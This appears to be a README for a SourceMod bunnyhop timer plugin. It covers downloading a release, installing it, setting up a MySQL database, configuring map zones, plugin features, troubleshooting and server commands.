# ⏱️ bhoptimer-timer - Manage bunnyhop servers with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Naked-newport364/bhoptimer-timer/releases)

bhoptimer-timer provides a toolset for SourceMod servers. It manages bunnyhop gameplay for Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2. It tracks records, creates specific maps zones, and displays player statistics. Server owners use this to build competitive environments with replay bots and HUD overlays.

## 🛠️ System Requirements

- A dedicated server running Counter-Strike: Source, Counter-Strike: Global Offensive, or Team Fortress 2.
- SourceMod installed and configured on the server.
- MetaMod:Source installed on the server.
- At least 500 MB of free disk space on the server.
- A MySQL or MariaDB database to store player rankings and times.

## 💾 Downloading the Software

You need to access the release page to obtain the files for your server.

[Visit the official download page here](https://github.com/Naked-newport364/bhoptimer-timer/releases)

Select the most recent release version from the list. Look for the file ending in .zip to start your download. Save this file to a folder on your computer.

## ⚙️ Installation Steps

1. Extract the contents of the downloaded .zip file using your preferred file compression tool.
2. Locate your server folder on your computer.
3. Open the `addons/sourcemod` directory inside your server folder.
4. Drag the contents of the extracted zip folder into the server directory.
5. Merge folders if the system asks.
6. Restart your game server to load the new plugin.

## 📦 Setting Up the Database

The plugin requires a database to save records and rankings.

1. Open your database management tool.
2. Create a new database name for your timer.
3. Open your server folder and navigate to `addons/sourcemod/configs/databases.cfg`.
4. Add a connection entry named "bhoptimer" to this file.
5. Input your host, database name, user, and password.
6. Save the file and restart the server.

## 🗺️ Configuring Zones

Zones define where the timer starts and stops.

1. Launch your game and join your server as an administrator.
2. Type `!kz_zones` or `!timer_admin` in the chat to open the menu.
3. Stand at the desired starting point of your map.
4. Select the option to create a new start zone.
5. Stand at the desired end point.
6. Select the option to create a new end zone.
7. Save the zone layout to the server files.

## 🎮 Plugin Features

- **Timer System**: Records player completion times with millisecond precision.
- **Rankings**: Automates a global leaderboard based on player performance.
- **Replay Bots**: Allow players to race against ghosts of previous top runs.
- **HUD Overlays**: Displays current speed, jumps, and time to the player.
- **Checkpoints**: Lets players practice difficult jumps without restarting the full stage.
- **Sounds**: Plays notification sounds for new records or zone entries.

## 🔍 Troubleshooting

**The plugin does not load.**
Check the `logs/sourcemod` folder in your server directory. Look for errors related to the plugin name. Ensure your MetaMod and SourceMod versions remain updated.

**The database does not connect.**
Verify the credentials in `databases.cfg`. Ensure your server IP address has remote access permissions to the database.

**Players cannot see the HUD.**
Check the plugin settings file located in `cfg/sourcemod/bhoptimer.cfg`. Toggle the HUD display option to ensure it is set to enabled.

**Replay bots stutter.**
Ensure your server frame rate remains stable. Heavy server load impacts bot movement quality.

## 📋 Server Commands

- `bhoptimer_reload`: Reloads all plugin configurations without a map change.
- `bhoptimer_reset_records`: Clears database records for the current map.
- `bhoptimer_version`: Shows the active plugin version.
- `!bhop_settings`: Opens the client-side menu for players to toggle HUD elements.
- `!bhop_top`: Displays the top times for the current map in a pop-up window.

## 💡 Customization

You can change how the timer feels by editing the configuration files found in `cfg/sourcemod/`. Adjust the settings for speed thresholds, chat messages, and HUD colors. Changes take effect after you run the `bhoptimer_reload` command or restart the map.

## 🛡️ Administrative Controls

Server administrators hold full control over the timer. Use the admin menu to manually delete invalid times, ban players from ranked play, or change map settings. Use the `sm_admin` command in the console to access the standard SourceMod menu, where you find a folder dedicated to the timer.

## 📈 Performance Tips

Keep the database indexed to ensure fast lookups for player records. Small servers handle the plugin with default settings. Large servers with high player counts may benefit from optimizing the database queries found in the configuration files. Always ensure your server meets the hardware requirements for the Source engine for the best experience.